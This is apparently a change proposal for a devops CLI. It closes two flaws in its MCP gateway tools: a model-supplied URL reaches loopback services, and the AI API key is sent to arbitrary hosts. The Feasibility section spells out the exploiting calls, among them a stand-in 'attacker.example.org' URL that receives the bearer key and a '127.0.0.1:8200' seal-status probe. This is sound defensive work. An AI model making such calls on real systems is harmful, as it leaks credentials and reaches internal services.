# Proposal

## Why

Issue #2480. The MCP tools `ai_gateway_status`, `ai_gateway_routes` and `ai_gateway_probe_backend` are read-only tools. Each one publishes a URL option (`gateway_url` or `backend_url`) that the model which calls the tool fills in. The command treats that URL as configuration. This causes two defects:

1. A URL from the model dials at the configured level. Since #2422, this level admits loopback without `ai.allow_private_network`. A call of `ai_gateway_probe_backend` with `backend_url="http://127.0.0.1:8200/..."` sends GET requests to a loopback service of the host, and the tool returns the status and the parsed model names.
2. `devops ai gateway routes` gives the router the AI API key, and the router sends `Authorization: Bearer <key>` to each URL. A call of `ai_gateway_routes` with a public `gateway_url` sends the key to that host. No egress level stops this, because each level admits a public address.

Both defects have one cause: input from a caller is used as configuration.

## What Changes

- The three MCP tools publish no URL option. `ai_gateway_status` and `ai_gateway_routes` publish only `provider`, and `ai_gateway_probe_backend` publishes only `backend`. The tools query the configured gateway and the configured backend. A call that gives a URL fails with the argument refusal of the MCP server, and sends no request. The commands keep `--gateway-url` and `--backend-url` for a person at the command line.
- `GatewayRouter.list_routes` sends the AI API key only to a gateway that has the scheme, host and port of the configured gateway URL. A `--gateway-url` of another origin gets no key. When such a gateway refuses the request and a key is set, the error says that the gateway got no key, and does not ask for a key.
- The help of `devops ai gateway routes --gateway-url` says that only the configured gateway gets the key.
- `SECURITY.md` states the rule: a URL that a model gives to an MCP tool is untrusted input, and a credential goes only to the origin that the configuration names.
- A consumer sees the tool schemas and the requests, so the change carries a spec delta. It adds three requirements to the capability `ai-gateway-routing`.
- This change fits one pull request.

## Capabilities

### New Capabilities

None.

### Modified Capabilities

- `ai-gateway-routing`: three new requirements. "The MCP gateway tools publish no URL" gives the tool schemas and the refusal of a URL. "The MCP gateway tools dial the configured gateway at the configured level" gives the level of their requests. "The AI API key goes only to the configured gateway" gives the origin rule of `devops ai gateway routes`.

## Impact

- `src/devops_cli/ai/mcp/generator.py`, `src/devops_cli/ai/gateway.py`, `src/devops_cli/commands/ai_gateway.py`.
- `tests/test_ai_gateway.py`.
- `docs/MCP_TOOLS.md`, `docs/CLI_REFERENCE.md`, `docs/commands/ai.md` (generated), `SECURITY.md`.

## Feasibility

- On `origin/main` at `a3eb41f4`, a test with `scripted_resolver` and `record_connects` from `tests/web_fakes.py` showed both defects:
  - `GatewayRouter(AIConfig(gateway_url="https://gateway.example.com/v1"), api_key="sk-secret").list_routes("https://attacker.example.org/v1")` dialled `93.184.215.14:443` and wrote `GET /v1/model/info` with `Host: attacker.example.org` and `Authorization: Bearer sk-secret`.
  - The MCP tool `ai_gateway_routes`, called with `gateway_url="https://attacker.example.org/v1"` and the key in `DEVOPS_CLI_AI_API_KEY`, wrote the same request.
  - The MCP tool `ai_gateway_probe_backend`, called with `backend_url="http://127.0.0.1:8200/v1/sys/seal-status?x="` and `ai.allow_private_network` false, dialled `127.0.0.1:8200`, wrote `GET /v1/sys/seal-status?x=/health`, and returned `healthy: true` with status 200.
- `generate_mcp_tools` publishes each Click option of a command in `CONST_MCP_EXPOSURE_TABLE`. `_PATH_PARAM_RESTRICTIONS` in `src/devops_cli/ai/mcp/generator.py` is the existing way to publish fewer, and `telemetry profile` uses it. `ArgumentContractMiddleware` refuses a parameter that the published schema does not name, and `test_every_published_schema_forbids_undeclared_parameters` holds `additionalProperties: false` for each tool.
- httpx2 2.13.1: `httpx2.URL(...).origin` holds the scheme, the host and the port. It gives equal origins for `http://a.example.com` and `HTTP://A.Example.com:80`, and it gives the host `attacker.example.com` for `http://gateway.example.com:4000@attacker.example.com:4000/v1`. `get_url_origin` in `devops_cli.http.urls` wraps it, and the benchmark runner uses it for the same key rule (#954).
- `grep` over `src` for `fetch_model_info`, `list_routes`, `probe_gateway` and `probe_backend` finds no caller of these that gets its URL from a model, other than the three commands behind the MCP tools.

## Existing Tool Considered

The change uses `httpx2.URL.origin` (through `get_url_origin`), the `_PATH_PARAM_RESTRICTIONS` table of the MCP generator and the argument contract of the MCP server. No open tool attaches a credential by the origin of the request: httpx strips an `Authorization` header only when a redirect leaves the origin, never on the first request. So the change builds one method, `GatewayRouter._key_for`, and one error function, `_withheld_key_refusal`, about 25 lines in all. The cost: about 3,000 tokens to build, about 500 tokens for each later change that keeps it, and the test class `TestTheKeyGoesOnlyToTheConfiguredGateway` to fix when the rule changes. The elapsed time to build is about one hour.

The change deletes the `gateway_url` and `backend_url` options of the three MCP tools, and the router's send of the key to every URL.
